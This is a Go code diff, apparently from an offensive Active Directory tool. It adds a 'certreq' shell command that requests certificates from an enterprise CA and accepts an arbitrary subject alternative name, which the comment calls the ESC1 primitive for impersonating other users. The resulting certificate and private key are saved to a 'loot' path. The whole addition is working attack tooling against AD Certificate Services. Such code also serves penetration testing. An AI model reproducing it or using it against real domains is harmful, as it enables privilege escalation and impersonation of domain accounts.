@@ -90,6 +90,92 @@ func (s *shell) cmdWhoAmI() {
 	printTable([]string{"GROUP", "SID"}, rows)
 }
 
+// cmdCertreq requests a certificate from the domain's enterprise CA
+// (MS-ICPR over the session's cert pipe): certreq <template> [-cn <name>]
+// [-san <upn>] [-ca <host\CA-Name>] [-out <file.pem>]. The enrollee-
+// supplied SAN is the ESC1 primitive — pair with `adenum adcs`.
+func (s *shell) cmdCertreq(args []string) {
+	var template, cn, san, ca, out string
+	for i := 0; i < len(args); i++ {
+		next := func() string {
+			if i+1 < len(args) {
+				i++
+				return args[i]
+			}
+			return ""
+		}
+		switch strings.ToLower(args[i]) {
+		case "-cn":
+			cn = next()
+		case "-san":
+			san = next()
+		case "-ca":
+			ca = next()
+		case "-out":
+			out = next()
+		default:
+			if template == "" && !strings.HasPrefix(args[i], "-") {
+				template = args[i]
+			} else {
+				fmt.Printf("  %s\n", ui.Muted.Sprint("usage: certreq <template> [-cn <name>] [-san <upn>] [-ca <host\\CA-Name>] [-out <file.pem>]"))
+				return
+			}
+		}
+	}
+	if template == "" {
+		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: certreq <template> [-cn <name>] [-san <upn>] [-ca <host\\CA-Name>] [-out <file.pem>]"))
+		return
+	}
+
+	var caHost, caName string
+	if ca != "" {
+		parts := strings.SplitN(ca, `\`, 2)
+		if len(parts) != 2 {
+			fmt.Printf("  %s\n", ui.Muted.Sprint("-ca wants <host\\CA-Name>"))
+			return
+		}
+		caHost, caName = parts[0], parts[1]
+	} else {
+		ui.Faint.Println("  opening LDAP channel")
+		var err error
+		caHost, caName, err = s.sess.FindCA()
+		if err != nil {
+			s.opError(err)
+			return
+		}
+	}
+	ui.Faint.Printf("  CA: %s\\%s\n", caHost, caName)
+
+	if cn == "" {
+		cn = s.sess.Creds().Username
+	}
+	ui.Faint.Printf("  requesting %s certificate for %s\n", template, cn)
+	if san != "" {
+		ui.Faint.Printf("  SAN: %s (enrollee-supplied subject)\n", san)
+	}
+
+	detail := cn
+	if san != "" {
+		detail += " san=" + san
+	}
+	res, err := s.sess.CertRequest(caHost, caName, template, cn, san)
+	s.trackOp(track.CategoryAD, "certreq", template, detail, err)
+	if err != nil {
+		s.opError(err)
+		return
+	}
+	ui.Faint.Printf("  issued: %s\n", res.Subject)
+
+	if out == "" {
+		out = s.lootPath(template + "-" + cn + ".pem")
+	}
+	if err := smbclient.WriteCertPEM(out, res.CertPEM, res.KeyPEM); err != nil {
+		ui.Warm.Printf("  warning: could not write cert: %v\n", err)
+		return
+	}
+	ui.Faint.Printf("  wrote cert+key to %s\n", out)
+}
+
 // printExecOutcome renders one remote-execution result in cmdExec's idiom.
 func (s *shell) printExecOutcome(method, cmdLine, out string, warnings []string, err error) {
 	s.trackOp(track.CategoryExec, method, cmdLine, "", err)
